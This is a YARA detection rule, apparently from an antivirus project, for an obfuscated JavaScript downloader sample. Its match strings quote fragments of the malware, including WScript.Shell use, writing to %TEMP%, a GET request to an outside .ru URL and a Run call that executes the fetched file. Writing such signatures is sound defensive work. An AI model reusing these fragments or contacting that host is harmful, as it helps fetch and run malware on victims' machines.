rule sig_20160427_117a5f7bfb184766165ab54f33dee0f5 {
  meta:
    description = "datamaliciousorder - file 20160427_117a5f7bfb184766165ab54f33dee0f5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4e1190ef9dc26244ca9c8493ba84a63e76725c34f8faac7fa77541ab94a55b5a"

  strings:
    $s1  = "function GlpyaEihhk(){return NjehfTpaos + \"\";};" fullword ascii
    $s2  = "function XjixnZvukk() {return VqrmiDnwvv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"zrX1uIX" ascii
    $s3  = "function XjixnZvukk() {return VqrmiDnwvv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"zrX1uIX" ascii
    $s4  = "function EjfjoSsulx(MuusiElmhk, VwkyoQvjaz){MkhrbNmrkt = MkhrbNmrkt * 1; return MuusiElmhk - VwkyoQvjaz;};" fullword ascii
    $s5  = "var VqrmiDnwvv = function IwuohElqzy() {return NnixiCdnaw[BtwmpSruwy](\"WScript\"+\".Shell\");}(), CwsrcCqkwk = 11;" fullword ascii
    $s6  = "XkdafWmxbm[MsdqhCierj](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s7  = "var NnixiCdnaw = this[\"WScript\"];" fullword ascii
    $s8  = "if (XkdafWmxbm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function WsrorTnwxk() {return ((HhhmpQtrbs == true) && (HhhmpQtrbs == SwlxfGnrbx)) ? 1 : MkhrbNmrkt;};" fullword ascii
    $s10 = "ChhiwCsisw = true;" fullword ascii
    $s11 = "function HpvycIsarn(){return 23;};" fullword ascii
    $s12 = "function VqneqVcelv(ItawtOzuoj){VqrmiDnwvv[\"R\"+\"un\"](ItawtOzuoj, MkhrbNmrkt, MkhrbNmrkt);};" fullword ascii
    $s13 = "var ChhiwCsisw = false;" fullword ascii
    $s14 = "var ZnbdrFjqsv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function RxhkjXraln()" fullword ascii
    $s16 = "var SwlxfGnrbx = false;" fullword ascii
    $s17 = "return EjfjoSsulx(TvgfxAlgwv, IoaheOqnek);" fullword ascii
    $s18 = "SwlxfGnrbx = true; " fullword ascii
    $s19 = "}while (PsbbxPhdcw);" fullword ascii
    $s20 = "function EzwoxNwnst(LatngOqxsp) {var MhodbLtfkw = (1, 2, 3, 4, 5, LatngOqxsp); return MhodbLtfkw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}